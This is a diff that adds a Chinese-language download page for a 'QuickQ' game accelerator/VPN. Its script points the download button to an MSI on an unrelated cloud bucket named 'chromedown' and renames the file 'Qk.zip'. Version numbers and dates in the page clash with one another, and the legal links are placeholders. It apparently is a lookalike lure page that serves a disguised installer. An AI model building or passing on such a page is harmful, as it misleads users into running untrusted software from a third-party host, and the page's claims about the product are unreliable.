@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>欢迎进入QuickQ</title>
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+html, body {
+  width: 100%;
+  height: 100%;
+  font-family: -apple-system, BlinkMacSystemFont, Inter, Segoe UI, Roboto, sans-serif;
+}
+body {
+  background: #f5f5f5;
+  color: #001d2f;
+}
+
+.html_main {
+  position: relative;
+  width: 100%;
+  min-height: 100vh;
+  background: url(../images/bg.png) center center / cover no-repeat;
+}
+
+.html_header {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  z-index: 99;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 20px 40px;
+  background: rgba(255,255,255,0.92);
+}
+
+.logo-img {
+  height: 70px;
+  width: auto;
+  display: block;
+}
+.right .language {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 16px;
+  color: #999;
+  cursor: pointer;
+}
+.language img {
+  width: 24px;
+}
+
+.html_content {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 140px 20px 80px;
+}
+.wrap {
+  display: flex;
+  align-items: center;
+  gap: 40px;
+  margin-bottom: 60px;
+}
+.windows {
+  flex: 1;
+}
+.windows h3 {
+  font-size: 32px;
+  color: #1a1a1a;
+  margin-bottom: 16px;
+}
+.windows p {
+  font-size: 18px;
+  color: #333;
+  margin-bottom: 10px;
+}
+
+.remarks {
+  margin: 30px 0;
+}
+.remarks_text {
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+.remarks_text img {
+  width: 28px;
+  height: 28px;
+}
+.remarks_text p {
+  font-size: 17px;
+  color: #666;
+  margin: 0;
+}
+
+.download-btn {
+  display: inline-block;
+  width: 220px;
+  height: 60px;
+  line-height: 60px;
+  text-align: center;
+  background: #fea01a;
+  color: #fff;
+  border-radius: 12px;
+  font-size: 18px;
+  text-decoration: none;
+  cursor: pointer;
+}
+.download-btn:hover {
+  opacity: 0.9;
+}
+
+.demonstration {
+  flex: 1;
+  text-align: center;
+}
+.demonstration img {
+  max-height: 520px;
+  max-width: 100%;
+}
+
+.system {
+  display: flex;
+  justify-content: space-around;
+  text-align: center;
+  margin-top: 40px;
+}
+.system_li img {
+  height: 100px;
+}
+.system_li p {
+  font-size: 16px;
+  color: #ccc;
+  margin-top: 8px;
+}
+.system_li .t {
+  color: #333;
+}
+
+.footer {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background: #4d4d4d;
+  padding: 15px 0;
+  text-align: center;
+}
+.footer_text {
+  color: #ccc;
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+.animation {
+  animation: fadeIn 0.6s ease forwards;
+}
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+</style>
+</head>
+
+<body>
+<div class="html_main">
+  <div class="html_header">
+    <img src="./accset/logo.png" alt="Logo" class="logo-img">
+
+    <div class="right">
+      <div class="language">
+        <div class="lang">
+          <img src="./accset/lang.png">
+          <span>简体中文</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="html_content">
+    <div class="wrap">
+      <div class="windows">
+        <h3 class="animation">游戏加速器</h3>
+        <p class="animation">最新版本: 108</p>
+        <p class="animation">支持 window 7/8/10/11</p>
+
+        <div class="remarks animation">
+          <div class="remarks_text">
+            <img src="./accset/icon.png">
+            <p>一键连接，无需手动配置</p>
+          </div>
+          <div class="remarks_text">
+            <img src="./accset/icon.png">
+            <p>多个游戏线路供你选择</p>
+          </div>
+          <div class="remarks_text">
+            <img src="./accset/icon.png">
+            <p>流量加密，零日志政策</p>
+          </div>
+          <div class="remarks_text">
+            <img src="./accset/icon.png">
+            <p>7*18小时客服支持</p>
+          </div>
+        </div>
+
+        <a href="javascript:;" class="download-btn animation download-app">立即下载</a>
+      </div>
+
+      <div class="demonstration animation">
+        <img src="./accset/1657012377344113.jpg">
+      </div>
+    </div>
+
+    <div class="system">
+      <div class="system_li">
+        <img src="./accset/download_ios.png">
+        <p>iPhone/iPad</p>
+      </div>
+      <div class="system_li">
+        <img src="./accset/download_android.png">
+        <p>Android</p>
+      </div>
+      <div class="system_li">
+        <img src="./accset/download_windows.png">
+        <p class="t">Windows</p>
+      </div>
+      <div class="system_li">
+        <img src="./accset/download_mac.png">
+        <p>Mac</p>
+      </div>
+      <div class="system_li">
+        <img src="./accset/download_linux.png">
+        <p>Linux</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer_text">
+      Copyright 2018-2022 quickq游戏加速器<br>
+      开发者名称：APP/游戏加速器 更新时间：2025-9-11 版本号：版本3.2.22 |
+      <a href="/" target="_blank" style="color:#ccc">用户协议</a> |
+      <a href="/" target="_blank" style="color:#ccc">隐私协议</a>
+    </div>
+  </div>
+</div>
+
+<script>
+window.downloadURL = 'https://chromedown.oss-ap-southeast-3.aliyuncs.com/QuickQ/inste%20win64-QuickQ102.00.msi';
+
+document.querySelectorAll('.download-app').forEach(link => {
+  link.onclick = function(e){
+    e.preventDefault();
+    let a = document.createElement('a');
+    a.href = window.downloadURL;
+    a.download = 'Qk.zip';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+});
+</script>
+</body>
+</html>
